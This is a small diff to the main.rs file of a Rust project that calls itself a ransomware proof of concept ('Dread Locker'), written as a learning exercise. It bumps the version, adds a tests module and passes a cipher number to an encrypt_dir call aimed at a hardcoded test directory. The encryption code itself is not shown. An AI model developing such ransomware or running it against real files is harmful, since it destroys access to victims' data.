@@ -2,6 +2,7 @@ use std::env;
 use std::process;
 mod settings;
 mod encryption_functions;
+mod tests;
 use crate::settings::Config;
 use crate::encryption_functions::encrypt_dir;
 fn main() {
@@ -12,11 +13,11 @@ fn main() {
         
     });
     style();
-    encrypt_dir("/mnt/f/Programming/Rust/dread_locker/test_dir");
+    encrypt_dir("/mnt/f/Programming/Rust/dread_locker/test_dir", config.cyphernumber);
 }
 fn style() {
     println!("---------------------------------------");
-    println!(r"\______Dread Locker version: 0.1______/");
+    println!(r"\______Dread Locker version: 0.2______/");
     println!("---------------------------------------");
     println!("Simple ransomware PoC because I'm currently learning Rust and I figured why not!");
 }
